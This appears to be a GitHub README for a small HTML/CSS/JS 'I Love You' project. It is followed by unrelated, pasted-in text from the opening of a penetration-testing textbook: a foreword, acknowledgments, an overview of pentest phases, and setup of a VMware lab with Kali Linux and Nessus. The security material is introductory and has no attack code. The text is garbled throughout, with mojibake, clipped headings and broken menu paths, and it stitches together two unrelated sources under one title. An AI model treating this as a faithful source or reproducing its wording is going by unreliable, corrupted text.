# love-and-impress-
üåü Project Showcase: A Special HTML, CSS &amp; JS Creation! üåüJust finished this fun project where I used HTML, CSS, and JavaScript to create something special. It‚Äôs a digital message for someone very important to me: "I Love You." ‚ù§Check it out and let me know what you think


Forewor
I met Georgia Weidman at a conference almost two 
years ago. Intrigued by what she was doing in the 
mobile device security field, I started following her 
work. At nearly every conference I‚Äôve attended since 
then, I‚Äôve run into Georgia and found her passionately sharing knowledge and ideas about mobile 
device security and her Smartphone Pentesting 
Framework. 
In fact, mobile device security is only one of the things Georgia does. 
Georgia performs penetration tests for a living; travels the world to deliver 
training on pentesting, the Metasploit Framework, and mobile device security; and presents novel and innovative ideas on how to assess the security of 
mobile devices at conferences. 
Georgia spares no effort in diving deeper into more advanced topics and working hard to learn new things. She is a former student of my 
(rather challenging) Exploit Development Bootcamp, and I can attest to 
the fact that she did very well throughout the entire class. Georgia is a true 
xx Foreword
hacker‚Äîalways willing to share her findings and knowledge with our great 
infosec community‚Äîand when she asked me to write the foreword to this 
book, I felt very privileged and honored.
As a chief information security officer, a significant part of my job 
revolves around designing, implementing, and managing an information 
security program. Risk management is a very important aspect of the program because it allows a company to measure and better understand its 
current position in terms of risk. It also allows a company to define priorities and implement measures to decrease risk to an acceptable level, based 
on the company‚Äôs core business activities, its mission and vision, and legal 
requirements.
Identifying all critical business processes, data, and data flows inside 
a company is one of the first steps in risk management. This step includes 
compiling a detailed inventory of all IT systems (equipment, networks, 
applications, interfaces, and so on) that support the company‚Äôs critical business processes and data from an IT perspective. The task is time consuming 
and it‚Äôs very easy to forget about certain systems that at first don‚Äôt seem to 
be directly related to supporting critical business processes and data, but 
that are nonetheless critical because other systems depend on them. This 
inventory is fundamentally important and is the perfect starting point for a 
risk-assessment exercise.
One of the goals of an information-security program is to define what 
is necessary to preserve the desired level of confidentiality, integrity, and 
availability of a company‚Äôs IT systems and data. Business process owners 
should be able to define their goals, and our job as information-security 
professionals is to implement measures to make sure we meet these goals 
and to test how effective these measures are. 
There are a few ways to determine the actual risk to the confidentiality, 
integrity, and availability of a company‚Äôs systems. One way is to perform a 
technical assessment to see how easy it would be for an adversary to undermine the desired level of confidentiality, break the integrity of systems, and 
interfere with the availability of systems, either by attacking them directly 
or by attacking the users with access to these systems.
That‚Äôs where a penetration tester (pentester, ethical hacker, or whatever you want to call it) comes into play. By combining knowledge of how 
systems are designed, built, and maintained with a skillset that includes 
finding creative ways around defenses, a good pentester is instrumental in 
identifying and demonstrating the strength of a company‚Äôs informationsecurity posture.
If you would like to become a penetration tester or if you are a systems/
network administrator who wants to know more about how to test the 
security of your systems, this book is perfect for you. You‚Äôll learn some of 
the more technical phases of a penetration test, beginning with the initial 
information-gathering process. You‚Äôll continue with explanations of how to 
exploit vulnerable networks and applications as you delve deeper into the 
network in order to determine how much damage could be done.
This book is unique because it‚Äôs not just a compilation of tools with 
a discussion of the available options. It takes a very practical approach, 
Foreword xxi
designed around a lab‚Äîa set of virtual machines with vulnerable applications‚Äîso you can safely try various pentesting techniques using publicly 
available free tools. 
Each chapter starts with an introduction and contains one or more 
hands-on exercises that will allow you to better understand how vulnerabilities can be discovered and exploited. You‚Äôll find helpful tips and tricks 
from an experienced professional pentester, real-life scenarios, proven techniques, and anecdotes from actual penetration tests. 
Entire books can be written (and have been) on the topics covered in 
each chapter in this book, and this book doesn‚Äôt claim to be the Wikipedia 
of pentesting. That said, it will certainly provide you with more than a first 
peek into the large variety of attacks that can be performed to assess a target‚Äôs security posture. Thanks to its guided, hands-on approach, you‚Äôll learn 
how to use the Metasploit Framework to exploit vulnerable applications and 
use a single hole in a system‚Äôs defenses to bypass all perimeter protections, 
dive deeper into the network, and exfiltrate data from the target systems. 
You‚Äôll learn how to bypass antivirus programs and perform efficient socialengineering attacks using tools like the Social-Engineer Toolkit. You‚Äôll see 
how easy it would be to break into a corporate Wi-Fi network, and how to use 
Georgia‚Äôs Smartphone Pentest Framework to assess how damaging a company‚Äôs bring your own device policy (or lack thereof) could be. Each chapter is designed to trigger your interest in pentesting and to provide you with 
first-hand insight into what goes on inside a pentester‚Äôs mind.
I hope this book will spark your creativity and desire to dive deeper into 
certain areas; to work hard and learn more; and to do your own research 
and share your knowledge with the community. As technology develops, 
environments change, and companies increasingly rely on technology 
to support their core business activities, the need for smart pentesters 
will increase. You are the future of this community and the informationsecurity industry. 
Good luck taking your first steps into the exciting world of pentesting. 
I‚Äôm sure you will enjoy this book!
Peter ‚Äúcorelanc0d3r‚Äù Van Eeckhoutte
Founder of Corelan Team

Acknowle dgme 
Many thanks go to the following people and organizations (in no particular 
order).
My parents, who have always supported my career endeavors‚Äîincluding 
paying for me to go to my first conference and get my first certifications when 
I was still a broke college student. 
Collegiate Cyber Defense Competition, particularly the Mid-Atlantic 
region Red Team, for helping me find what I wanted to do with my life. 
ShmooCon for accepting my first talk ever and also being the first conference I ever attended. 
Peiter ‚ÄúMudge‚Äù Zatko and everyone who involved in the DARPA Cyber 
Fast Track program for giving me the opportunity to start my own company 
and build the Smartphone Pentest Framework.
James Siegel for being my lucky charm and making sure I get on stage 
on time at events. 
Rob Fuller for taking the time to come to James Madison University 
and visit the CCDC team after the competition. That day I decided to make 
a career of infosec. 
John Fulmer for helping me with the crypto details in the wireless chapter. 
Rachel Russell and Micheal Cottingham for being my first infosec buddies. 
Jason and Rachel Oliver for technical and content review, and also for 
making the perfect smoky eye look at ShmooCon and Black Hat. 
xxiv Acknowledgments
Joe McCray, my infosec big brother, for being my mentor as I learn to 
navigate the infosec business. 
Leonard Chin for giving me my first big international conference experience and the confidence to become a conference trainer. 
Brian Carty for helping me build my online lab. 
Tom Bruch for letting me live in his house when I had no job and my 
DARPA money hadn‚Äôt come through yet. 
Dave Kennedy for providing introductions for several great opportunities. 
Grecs for helping me market my classes on his website. 
Raphael Mudge for getting me in touch with the DARPA Cyber Fast 
Track program and many other great opportunities. 
Peter Hesse and Gene Meltser for forcing me to have the courage to 
move up at key junctures in my career. 
Jayson Street for being a pickier eater than me so I almost pass as normal at speaker dinners in foreign countries. You are the best. 
Ian Amit for recommending me for some great speaking slots when I 
was just starting out. 
Martin Bos for being awesome. You know what I mean. 
Jason Kent for all those global premier upgrades and wonderful tautologies for definitions, some of which appear herein. 
My professors at James Madison University, particularly Samuel T. 
Redwine‚Äîyou inspired me more than you will ever know. 
The people at No Starch Press for their help and support in developing 
this book, including Alison Law, Tyler Ortman, and KC Crowell. Special 
thanks to my editor and No Starch‚Äôs publisher, Bill Pollock.
I ntrod  c t
I decided to write this book because it was the sort 
of book I wish I had had when I was starting out in 
information security. Though there are certainly 
more informative websites out there than when I 
first started, I still find it‚Äôs difficult for a beginner to 
know what to read first and where to get the expected prerequisite skills. 
Likewise, there are a lot of books on the market‚Äîseveral great ones on 
advanced topics, which require some background knowledge, and many 
good books aimed at beginners, which cover a significant amount of theory. 
But I haven‚Äôt found anything that says everything I want to say to the aspiring 
pentester who emails me looking for a place to start in information security. 
In my teaching career I‚Äôve always found that my favorite course to 
teach is Introduction to Pentesting. The students always have a thirst for 
knowledge that is lots of fun to be around. Thus, when I was approached 
by No Starch Press to write a book, this was the book I proposed. When I 
announced it, many people assumed I was writing a mobile security book, 
but while I considered that, I thought an introduction to pentesting would 
make the biggest impact on the audience I most wanted to reach.
xxvi Introduction
A Note of Tha
A book like this would not be possible without many years of dedicated 
work on the part of the information security community. The tools and 
techniques discussed throughout this book are some of the ones my colleagues and I use regularly on engagements, and they‚Äôve been developed 
through the combined efforts of pentesters and other security experts all 
over the world. I‚Äôve contributed to some of these open source projects (such 
as Mona.py, which we‚Äôll use in the exploit development chapters), and I hope 
this book will inspire you to do the same. 
I want to take this opportunity to thank Offensive Security for creating 
and maintaining the Kali Linux pentesting distribution used widely in the 
field and throughout this book. A huge amount of credit also goes to the 
core developers of the Metasploit Framework, as well as its numerous community contributors. Thanks too to all the pentesters and researchers who 
have shared their knowledge, discoveries, and techniques with the community so that we can use them to assess the security posture of our clients 
more effectively, and so that teachers like me can use them with our students. 
Thanks as well to the creators of the great books, blog posts, courses, 
and so on that have helped me achieve my goal of becoming a professional 
pentester. I now hope to share the knowledge I‚Äôve gained with other aspiring pentesters. 
You‚Äôll find a list of additional resources (including courses and blogs) 
at the end of this book. These are some of the resources that I have found 
helpful on my own journey in infosec, and I encourage you to use them to 
learn more about the many penetration testing topics covered in this book. 
I hope you enjoy your journey as much as I have.
About This Bo
To work through this book, you will need to know how to install software 
on your computer. That‚Äôs it. You don‚Äôt need to be a Linux expert or know 
the nitty-gritty of how networking protocols work. When you encounter 
a topic that is not familiar to you, I encourage you to do some outside 
research beyond my explanations if you need to‚Äîbut we will walk step-bystep through all the tools and techniques that may be new to you, starting 
with the Linux command line. When I started in information security, the 
closest thing I‚Äôd ever done to hacking was making the Windows XP pre-SP2 
Start menu say Georgia instead of Start. And I was pretty proud of myself at 
the time.
And then I went to the Collegiate Cyber Defense Competition and all 
the Red Team members were using the command line at rapid speed and 
making pop-up windows appear on my desktop from across a crowded 
room. All I knew was that I wanted to be like them. There was a lot of hard 
work between then and now, and there will be much more hard work as I 
endeavor to reach the highest level of information security. I only hope that 
with this book I can inspire more people to follow the same path.
Introduction xxvii
Part I: The Basics
In Chapter 0, we start out with some basic definitions of the phases of penetration testing. In Chapter 1, we build our small practice laboratory, which we 
will use to work through the exercises in this book. With many books, it‚Äôs possible to just download a few programs onto your existing platform, but to simulate a penetration test, our approach is a bit more involved. I recommend 
that you take the time to set up your lab and work through the hands-on 
examples with me. Though this book can serve as a reference and reminder 
in the field, I believe it is best to first practice your pentesting skills at home.
In Chapter 2, we start with the basics of using Kali Linux and Linux 
operating systems in general. Next, Chapter 3 covers the basics of programming. Some readers may already have a working knowledge in these areas 
and can skip past them. When I first started out, I had some programming 
experience in C and Java, but I didn‚Äôt have a background in scripting, and 
I had practically no background in Linux‚Äîa skillset that was assumed by 
most of the hacking tutorials I encountered. Thus, I have provided a primer 
here. If you are new to these areas, please do continue your studies outside 
of this book. Linux-based operating systems are becoming more and more 
prevalent as the platforms for mobile devices and web services, so skills in 
this area will benefit you even if you don‚Äôt pursue a career in information 
security. Likewise, knowing how to script your common tasks can only make 
your life easier, regardless of your career.
We look at the basics of using the Metasploit Framework, a tool we will 
leverage throughout this book, in Chapter 4. Though we will also learn to 
perform many tasks without Metasploit, it is a go-to tool for many pentesters in the field and is constantly evolving to include the latest threats and 
techniques.
Part II: Assessments
Next we start working through a simulated penetration test. In Chapter 5, 
we begin by gathering data about our target‚Äîboth by searching freely 
available information online and by engaging our target systems. We then 
start searching for vulnerabilities using a combination of querying the systems and research in Chapter 6. In Chapter 7, we look at techniques to capture traffic that might include sensitive data.
Part III: Attacks
Next, in Chapter 8, we look at exploiting the vulnerabilities we found on 
the network with a variety of tools and techniques, including Metasploit and 
purely manual exploitation. We then look at methods for attacking what is 
often the weakest link in a network‚Äôs security‚Äîpassword management‚Äîin 
Chapter 9.
We next look at some more advanced exploitation techniques. Not 
all vulnerabilities are in a service listening on the network. Web browsers, 
PDF readers, Java, Microsoft Office‚Äîthey all have been subject to security 
issues. As clients work harder to secure their networks, attacking clientside software may be the key to getting a foothold in the network. We look 
xxviii Introduction
at leveraging client-side attacks in Chapter 10. In Chapter 11, we combine 
client-side attacks with a look at social engineering, or attacking the human 
element‚Äîthe part of the environment that cannot be patched. After all, with 
client-side attacks, the software in question must open a malicious file of 
some sort, so we must convince the user to help us out. In Chapter 12, we 
look at some methods of bypassing antivirus software, as many of your clients will deploy it. If you have high enough privileges on a system, you may 
be able to just turn antivirus programs off, but a better solution is to breeze 
right past antivirus programs undetected, which can be done even if you 
are saving malicious programs to the hard drive.
In Chapter 13, we pick up with the next phase of our penetration test, 
post exploitation. Some say the pentest truly begins after exploitation. This 
is where you leverage your access to find additional systems to attack, sensitive information to steal, and so on. If you continue your penetration testing studies, you will spend a good deal of time working on the latest and 
greatest post-exploitation techniques.
After post exploitation, we look at a few additional skills you will need 
to be a well-rounded penetration tester. We will take a brief look at assessing the security of custom web applications in Chapter 14. Everyone has a 
website these days, so it‚Äôs a good skill to cultivate. Next we will look at assessing the security of wireless networks in Chapter 15, looking at methods for 
cracking commonly deployed cryptographic systems.
Part IV: Exploit Development
Chapters 16, 17, 18, and 19 discuss the basics of writing your own exploits. 
We will look at finding vulnerabilities, exploiting them with common techniques, and even writing our own Metasploit module. Up until these chapters, we have relied on tools and publicly available exploits for a lot of our 
exercises. As you advance in infosec, you may want to find new bugs (called 
zero-days) and report them to vendors for a possible bounty. You can then 
release a public exploit and/or Metasploit module to help other pentesters 
test their customers‚Äô environments for the issue you discovered.
Part V: Mobile Hacking
Finally, in Chapter 20, we close with a relatively new area of penetration testing‚Äîassessing the security of mobile devices. We look at my own tool, the 
Smartphone Pentest Framework. Perhaps after mastering the skills in this 
book, you will endeavor to develop and release a security tool of your own.
Of course, this book doesn‚Äôt cover every single facet of information 
security, nor every tool or technique. If it did, this book would have been 
several times longer and come out a good deal later, and I need to get back 
to my research. So here you have it: a hands-on introduction to hacking. It is 
an honor to be with you on this important step on your journey into information security. I hope that you learn a lot from this book and that it inspires 
you to continue your studies and become an active member of this exciting 
and rapidly developing field.
0
Penetr ation  esting Prime
Penetration testing, or pentesting (not to be confused 
with testing ballpoint or fountain pens), involves simulating real attacks to assess the risk associated with 
potential security breaches. On a pentest (as opposed 
to a vulnerability assessment), the testers not only discover vulnerabilities that could be used by attackers 
but also exploit vulnerabilities, where possible, to 
assess what attackers might gain after a successful 
exploitation. 
From time to time, a news story breaks about a major company being 
hit by a cyberattack. More often than not, the attackers didn‚Äôt use the latest 
and greatest zero-day (a vulnerability unpatched by the software publishers). 
Major companies with sizable security budgets fall victim to SQL injection vulnerabilities on their websites, social-engineering attacks against 
employees, weak passwords on Internet-facing services, and so on. In other 
2 Chapter 0
words, companies are losing proprietary data and exposing their clients‚Äô 
personal details through security holes that could have been fixed. On a 
penetration test, we find these issues before an attacker does, and we recommend how to fix them and avoid future vulnerabilities.
The scope of your pentests will vary from client to client, as will your 
tasks. Some clients will have an excellent security posture, while others will 
have vulnerabilities that could allow attackers to breach the perimeter and 
gain access to internal systems. 
You may also be tasked with assessing one or many custom web applications. You may perform social-engineering and client-side attacks to gain 
access to a client‚Äôs internal network. Some pentests will require you to act 
like an insider‚Äîa malicious employee or attacker who has already breached 
the perimeter‚Äîas you perform an internal penetration test. Some clients will 
request an external penetration test, in which you simulate an attack via the 
Internet. And some clients may want you to assess the security of the wireless networks in their office. In some cases, you may even audit a client‚Äôs 
physical security controls. 
The Stages of the Penetration T
Pentesting begins with the pre-engagement phase, which involves talking to 
the client about their goals for the pentest, mapping out the scope (the 
extent and parameters of the test), and so on. When the pentester and the 
client agree about scope, reporting format, and other topics, the actual testing begins. 
In the information-gathering phase, the pentester searches for publicly 
available information about the client and identifies potential ways to connect to its systems. In the threat-modeling phase, the tester uses this information to determine the value of each finding and the impact to the client if 
the finding permitted an attacker to break into a system. This evaluation 
allows the pentester to develop an action plan and methods of attack.
Before the pentester can start attacking systems, he or she performs a 
vulnerability analysis. In this phase, the pentester attempts to discover vulnerabilities in the systems that can be taken advantage of in the exploitation
phase. A successful exploit might lead to a post-exploitation phase, where the 
result of the exploitation is leveraged to find additional information, sensitive data, access to other systems, and so on. 
Finally, in the reporting phase, the pentester summarizes the findings for 
both executives and technical practitioners. 
N ote For more information on pentesting, a good place to start is the Penetration Testing
Execution Standard (PTES) at http://www.pentest-standard.org/.
Pre-engagement
Before the pentest begins, pentesters perform pre-engagement interactions with the client to make sure everyone is on the same page about the 
Penetration Testing Primer 3
penetration testing. Miscommunication between a pentester and a client 
who expects a simple vulnerability scan could lead to a sticky situation 
because penetration tests are much more intrusive. 
The pre-engagement stage is when you should take the time to understand your client‚Äôs business goals for the pentest. If this is their first pentest, 
what prompted them to find a pentester? What exposures are they most 
worried about? Do they have any fragile devices you need to be careful 
with when testing? (I‚Äôve encountered everything from windmills to medical 
devices hooked up to patients on networks.) 
Ask questions about your client‚Äôs business. What matters most to them? 
For example, to a top online vendor, hours of downtime could mean thousands of dollars of lost revenue. To a local bank, having online banking sites 
go down for a few hours may annoy a few customers, but that downtime 
wouldn‚Äôt be nearly as devastating as the compromise of a credit card database. To an information security vendor, having their homepage plastered 
with rude messages from attackers could lead to a damaged reputation that 
snowballs into a major revenue loss. 
Other important items to discuss and agree upon during the preengagement phase of the pentest include the following:
Scope
What IP addresses or hosts are in scope, and what is not in scope? What 
sorts of actions will the client allow you to perform? Are you allowed to 
use exploits and potentially bring down a service, or should you limit the 
assessment to merely detecting possible vulnerabilities? Does the client 
understand that even a simple port scan could bring down a server or 
router? Are you allowed to perform a social-engineering attack?
The testing window
The client may want you to perform tests only during specific hours or 
on certain days.
Contact information
Whom should you contact if you find something serious? Does the client expect you to contact someone 24 hours a day? Do they prefer that 
you use encryption for email? 
A ‚Äúget out of jail free‚Äù card
Make sure you have authorization to perform a penetration test on the 
target. If a target is not owned by the company (for instance, because 
it‚Äôs hosted by a third party), make sure to verify that the client has 
formal approval from the third party to perform the penetration test. 
Regardless, make sure your contract includes a statement that limits 
your liability in case something unexpected happens, and get written 
permission to perform the test.
Payment terms
How and when will you be paid, and how much?
4 Chapter 0
Finally, include a nondisclosure agreement clause in your contract. 
Clients will appreciate your written commitment to keep the penetration 
test and any findings confidential.
Information Gathering
Next is the information-gathering phase. During this phase, you analyze 
freely available sources of information, a process known as gathering open 
source intelligence (OSINT). You also begin to use tools such as port scanners 
to get an idea of what systems are out there on the Internet or internal network as well as what software is running. We‚Äôll explore information gathering in more detail in Chapter 5.
Threat Modeling
Based on the knowledge gained in the information-gathering phase, we 
move on to threat modeling. Here we think like attackers and develop plans 
of attack based on the information we‚Äôve gathered. For example, if the client 
develops proprietary software, an attacker could devastate the organization 
by gaining access to their internal development systems, where the source 
code is developed and tested, and selling the company‚Äôs trade secrets to a 
competitor. Based on the data we found during information gathering, we 
develop strategies to penetrate a client‚Äôs systems. 
Vulnerability Analysis
Next, pentesters begin to actively discover vulnerabilities to determine how 
successful their exploit strategies might be. Failed exploits can crash services, set off intrusion-detection alerts, and otherwise ruin your chances of 
successful exploitation. Often during this phase, pentesters run vulnerability scanners, which use vulnerability databases and a series of active checks 
to make a best guess about which vulnerabilities are present on a client‚Äôs system. But though vulnerability scanners are powerful tools, they can‚Äôt fully 
replace critical thinking, so we also perform manual analysis and verify 
results on our own in this phase as well. We‚Äôll explore various vulnerabilityidentification tools and techniques in Chapter 6.
Exploitation
Now for the fun stuff: exploitation. Here we run exploits against the vulnerabilities we‚Äôve discovered (sometimes using a tool like Metasploit) in an 
attempt to access a client‚Äôs systems. As you‚Äôll see, some vulnerabilities will be 
remarkably easy to exploit, such as logging in with default passwords. We‚Äôll 
look at exploitation in Chapter 8.
Post Exploitation
Some say pentests truly begin only after exploitation, in the post-exploitation 
phase. You got in, but what does that intrusion really mean to the client? If 
you broke into an unpatched legacy system that isn‚Äôt part of a domain or 
Penetration Testing Primer 5
otherwise networked to high-value targets, and that system contains no 
information of interest to an attacker, that vulnerability‚Äôs risk is significantly 
lower than if you were able to exploit a domain controller or a client‚Äôs development system. 
During post exploitation, we gather information about the attacked system, look for interesting files, attempt to elevate our privileges where necessary, and so on. For example, we might dump password hashes to see if we 
can reverse them or use them to access additional systems. We might also 
try to use the exploited machine to attack systems not previously available 
to us by pivoting into them. We‚Äôll examine post exploitation in Chapter 13. 
Reporting 
The final phase of penetration testing is reporting. This is where we convey 
our findings to the customer in a meaningful way. We tell them what they‚Äôre 
doing correctly, where they need to improve their security posture, how you 
got in, what you found, how to fix problems, and so on. 
Writing a good pentest report is an art that takes practice to master. 
You‚Äôll need to convey your findings clearly to everyone from the IT staff 
charged with fixing vulnerabilities to upper management who signs off on 
the changes to external auditors. For instance, if a nontechnical type reads, 
‚ÄúAnd then I used MS08-067 to get a shell,‚Äù he or she might think, ‚ÄúYou mean, 
like a seashell?‚Äù A better way to communicate this thought would be to mention the private data you were able to access or change. A statement like ‚ÄúI 
was able to read your email,‚Äù will resonate with almost anyone. 
The pentest report should include both an executive summary and a 
technical report, as discussed in the following sections.
Executive Summary
The executive summary describes the goals of the test and offers a highlevel overview of the findings. The intended audience is the executives in 
charge of the security program. Your executive summary should include 
the following:
Background A description of the purpose of the test and definitions 
of any terms that may be unfamiliar to executives, such as vulnerability
and countermeasure. 
Overall posture An overview of the effectiveness of the test, the 
issues found (such as exploiting the MS08-067 Microsoft vulnerability), 
and general issues that cause vulnerabilities, such as a lack of patch 
management.
Risk profile An overall rank of the organization‚Äôs security posture 
compared to similar organizations with measures such as high, moderate, or low. You should also include an explanation of the ranking. 
General findings A general synopsis of the issues identified along 
with statistics and metrics on the effectiveness of any countermeasures 
deployed. 
6 Chapter 0
Recommendation summary A high-level overview of the tasks required 
to remediate the issues discovered in the pentest. 
Strategic road map Give the client short- and long-term goals to 
improve their security posture. For example, you might tell them to 
apply certain patches now to address short-term concerns, but without 
a long-term plan for patch management, the client will be in the same 
position after new patches have been released. 
Technical Report
This section of the report offers technical details of the test. It should 
include the following:
Introduction An inventory of details such as scope, contacts, and so on. 
Information gathering Details of the findings in the informationgathering phase. Of particular interest is the client‚Äôs Internet footprint. 
Vulnerability assessment Details of the findings of the vulnerabilityanalysis phase of the test. 
Exploitation/vulnerability verification Details of the findings from 
the exploitation phase of the test.
Post exploitation Details of the findings of the post-exploitation 
phase of the test. 
Risk/exposure A quantitative description of the risk discovered. This 
section estimates the loss if the identified vulnerabilities were exploited 
by an attacker. 
Conclusion A final overview of the test. 
Summar
This chapter has taken a brief look at the phases of penetration testing, 
including pre-engagement, information gathering, threat modeling, 
vulnerability analysis, exploitation, post exploitation, and reporting. 
Familiarity with these phases will be crucial as you begin your pentesting 
career, and you‚Äôll learn more about them as you move through the book.
Part
Th e Bas 

1
SettingUp Your Virtul 
As you work through this book, you‚Äôll get hands-on 
experience using different tools and techniques for 
penetration testing by working in a virtual lab running in the VMware virtualization software. I‚Äôll walk 
you through setting up your lab to run multiple operating systems inside 
your base operating system in order to simulate an entire network using 
just one physical machine. We‚Äôll use our lab to attack target systems 
throughout this book. 
Installing VMwa
As the first step in setting up your virtual lab, download and install a desktop VMware product. VMware Player is available free for personal use for 
Microsoft Windows and Linux operating systems (http://www.vmware.com/
products/player/). VMware also offers VMware Workstation (http://www
.vmware.com/products/workstation/) for Windows and Linux, which includes 
10 Chapter 1
additional features such as the ability to take snapshots of the virtual 
machine that you can revert to in case you break something. VMware 
Workstation is available for free for 30 days, but after that, you will need 
to buy it or switch back to using VMware Player. 
Mac users can run a trial version of VMware Fusion (http://www.vmware
.com/products/fusion/) free for 30 days, and it costs only about $50 after that. 
As a Mac user, I‚Äôll use VMware Fusion throughout the book, but setup 
instructions are also included for VMware Player. 
Download the version of VMware that matches your operating system 
and architecture (32- or 64-bit). If you encounter any problems installing 
VMware, you‚Äôll find plenty of support at the VMware website.
Setting Up Kali Lin
Kali Linux is a Debian-based Linux distribution that comes with a wide 
variety of preinstalled security tools that we‚Äôll use throughout this book. 
This book is written for Kali 1.0.6, the current version as of this writing. 
You‚Äôll find a link to a torrent containing a copy of Kali 1.0.6 at this book‚Äôs 
website (http://nostarch.com/pentesting/). As time passes, newer versions of 
Kali will be released. If you would like, feel free to download the latest version of Kali Linux from http://www.kali.org/. Keep in mind, though, that 
many of the tools we‚Äôll use in this book are in active development, so if you 
use a newer version of Kali, some of the exercises may differ from the walkthroughs in this book. If you prefer everything to work as written, I recommend using the version of Kali 1.0.6 provided in the torrent (a file called 
kali-linux-1.0.6-vm-i486.7z), which is a prebuilt VMware image compressed 
with 7-Zip. 
N ote You can find 7-Zip programs for Windows and Linux platforms at http://ww
.7-zip.org/download.html. For Mac users, I recommend Ez7z from http://ez7z
.en.softonic.com/mac/. 
1. Once the 7-Zip archive is decompressed, in VMware go to File4Open
and direct it to the file Kali Linux 1.0.6 32 bit.vmx in the decompressed 
Kali Linux 1.0.6 32 bit folder. 
2. Once the virtual machine opens, click the Play button and, when 
prompted as shown in Figure 1-1, choose I copied it.
3. As Kali Linux boots up, you will be prompted as shown in Figure 1-2. 
Choose the top (default) highlighted option.
Setting Up Your Virtual Lab 11
Figure 1-1: Opening the Kali Linux virtual machine
Figure 1-2: Booting Kali Linux
12 Chapter 1
4. Once Kali Linux boots, you will be presented with a login screen like 
the one shown in Figure 1-3.
Figure 1-3: Kali login screen 
5. Click Other and enter the default credentials for Kali Linux, root:toor, as 
shown in Figure 1-4. Then click the Log In button.
Figure 1-4: Logging into Kali
Setting Up Your Virtual Lab 13
6. You will be presented with a screen like the one shown in Figure 1-5.
Figure 1-5: The Kali Linux GUI
Configuring the Network for Your Virtual Machine
Because we‚Äôll be using Kali Linux to attack our target systems over a network, we need to place all our virtual machines on the same virtual network 
(we will see an example of moving between networks in Chapter 13, which 
covers post exploitation). VMware offers three options for virtual network 
connections: bridged, NAT, and host only. You should choose the bridged 
option, but here‚Äôs a bit of information about each:
‚Ä¢	 The bridged network connects the virtual machine directly to the local 
network using the same connection as the host system. As far as the 
local network is concerned, our virtual machine is just another node 
on the network with its own IP address. 
‚Ä¢	 NAT, short for network address translation, sets up a private network on the 
host machine. The private network translates outgoing traffic from the 
virtual machine to the local network. On the local network, traffic from 
the virtual machine will appear to come from the host machine‚Äôs IP 
address.
‚Ä¢	 The host-only network limits the virtual machine to a local private network on the host. The virtual machine will be able to communicate 
with other virtual machines in the host-only network as well as the host 
machine itself, but it will not be able to send or receive any traffic with 
the local network or the Internet.
14 Chapter 1
N ote Because our target virtual machines will have multiple known security vulnerabilities, use caution when attaching them to your local network because anyone else on
that network can also attack these machines. For this reason, I do not recommend working through this book on a public network where you do not trust the other users. 
By default, the Kali Linux virtual machine network adapter is set to 
NAT. Here‚Äôs how to change that option on both Windows and Mac OS.
VMware Player on Microsoft Windows
To change the virtual network on VMware Player for Windows, start VMware 
Player and then click your Kali Linux virtual machine. Choose Edit virtual 
machine settings, as shown in Figure 1-6. (If you‚Äôre still running Kali Linux 
in VMware Player, choose Player4Manage4Virtual machine settings.)
Figure 1-6: Changing the VMware network adapter
On the next screen, choose Network Adapter in the Hardware tab and 
choose the Bridged option in the Network connection section, as shown in 
Figure 1-7.
Setting Up Your Virtual Lab 15
Figure 1-7: Changing the network adapter settings
Now click the Configure Adapters button and check the network 
adapter that you‚Äôre using with your host operating system. As you can see 
in Figure 1-8, I‚Äôve selected only the Realtek wireless adapter. Once you‚Äôve 
made your selection, press OK.
Figure 1-8: Selecting a network adapter
16 Chapter 1
VMware Fusion on Mac OS 
To change the virtual network connection in VMware Fusion, go to Virtual 
Machine4Network Adapter and change from NAT to Bridged, as shown in 
Figure 1-9.
Figure 1-9: Changing the network adapter 
Connecting the Virtual Machine to the Network
Kali Linux should automatically pull an IP address from the Bridged network 
once you make the switch. To verify your IP address, open a Linux terminal 
by clicking the terminal icon(a black rectangle with the symbols >_) at the 
top left of the Kali screen (or choose Applications4Accessories4Terminal). 
Then run the command ifconfig to see your network information, as shown 
in Listing 1-1. 
root@kali:~# ifconfig
eth0 Link encap:Ethernet HWaddr 00:0c:29:df:7e:4d 
 inet addr:192.168.20.9 Bcast:192.168.20.255 Mask:255.255.255.0
 inet6 addr: fe80::20c:29ff:fedf:7e4d/64 Scope:Link
--snip--
Listing 1-1: Networking information 
NOTE The prompt root@kali:~# is the superuser (root) prompt. We will learn more ab
this and the other Linux commands we use for setup in Chapter 2. 
Setting Up Your Virtual Lab 17
The IPv4 address for this virtual machine is 192.168.20.9, as highlighted 
in bold in Listing 1-1. (The IP address for your machine will likely differ.) 
Testing Your Internet Acces
Now let‚Äôs make sure that Kali Linux can connect to the Internet. We‚Äôll use 
the ping network utility to see if we can reach Google. Make sure your computer is connected to the Internet, open a Linux terminal, and enter the 
following.
root@kali:~# ping www.google.com
If you see something like the following in response, you‚Äôre online. 
(We‚Äôll learn more about the ping command in Chapter 3.)
PING www.google.com (50.0.2.221) 56(84) bytes of data.
64 bytes from cache.google.com (50.0.2.221): icmp_req=1 ttl=60 time=28.7 ms
64 bytes from cache.google.com (50.0.2.221): icmp_req=2 ttl=60 time=28.1 ms
64 bytes from cache.google.com (50.0.2.221): icmp_req=3 ttl=60 time=27.4 ms
64 bytes from cache.google.com (50.0.2.221): icmp_req=4 ttl=60 time=29.4 ms
64 bytes from cache.google.com (50.0.2.221): icmp_req=5 ttl=60 time=28.7 ms
64 bytes from cache.google.com (50.0.2.221): icmp_req=6 ttl=60 time=28.0 ms
--snip--
If you do not receive a response, make sure that you have set your network adapter to Bridged, that Kali Linux has an IP address, and, of course, 
that your host system currently has Internet access. 
Installing Nessus
Although Kali Linux has just about every tool we‚Äôll need, we do need to 
install a few additional programs. First, we‚Äôll install Tenable Security‚Äôs 
Nessus Home vulnerability scanner. This scanner is free for home use only 
(you‚Äôll see a description of limitations on the Nessus website). Note that 
Nessus is very actively developed, so the current version as well as its GUI 
may have changed a bit since this book went to press. 
Use the following steps to install Nessus Home from within Kali: 
1. Open Applications4Internet4Iceweasel Web Browser and enter 
http://www.tenable.com/products/nessus-home/ in the address bar. Complete 
the Register for an Activation Code information and click Register. 
(Use a real email address‚Äîyou‚Äôll need the activation code later.) 
2. Once you reach the Downloads page, choose the latest version of Nessus 
for the Linux Debian 32-bit platform (Nessus-5.2.5-debian6_i386.deb as of 
this writing) and download it to your root directory (the default download location). 
3. Open a Linux terminal (click the terminal icon at the top of the Kali 
screen) to open a root prompt. 
18 Chapter 1
4. Enter ls to see a list of the files in your root directory. You should see 
the Nessus file that you just downloaded. 
5. Enter dpkg -i followed by the name of the file you downloaded (you can 
type the first letter of the filename and press tab to use tab completion) 
and press enter to begin the install process. Installation may take a while 
